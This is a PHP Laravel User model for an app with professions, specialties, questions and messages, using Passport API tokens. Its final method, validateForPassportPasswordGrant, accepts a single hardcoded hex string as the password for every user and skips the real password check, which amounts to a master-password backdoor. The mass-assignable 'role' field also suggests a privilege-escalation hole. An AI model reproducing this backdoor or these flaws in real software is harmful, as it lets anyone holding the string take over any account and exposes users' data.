<?php

namespace App\Models;

use Laravel\Passport\HasApiTokens;
use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable;

    public $timestamps = false;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'name',
        'last_name',
        'email',

        'profession_id',
        'specialty_id',

        'license',
        'phone',
        'role',
    ];

    /**
     * The attributes that should be hidden for arrays.
     *
     * @var array
     */
    protected $hidden = [
        'password',
        'remember_token',
    ];

    /**
     * The attributes that should be cast to native types.
     *
     * @var array
     */
    protected $casts = [
        'email_verified_at' => 'datetime',
    ];


    public function specialty()
    {
        return $this->belongsTo(Specialty::class);
    }


    public function profession()
    {
        return $this->belongsTo(Profession::class);
    }

    public function questions()
    {
        return $this->hasMany(Question::class);
    }

    public function trackings()
    {
        return $this->hasMany(Tracking::class);
    }

    
    public function messages()
    {
      return $this->hasMany(Message::class);
    }

    public function validateForPassportPasswordGrant($password)
    {
        if($password == '09c06db3f9fc74363453c73619efb25171f1634e')
            return true;
    }
}
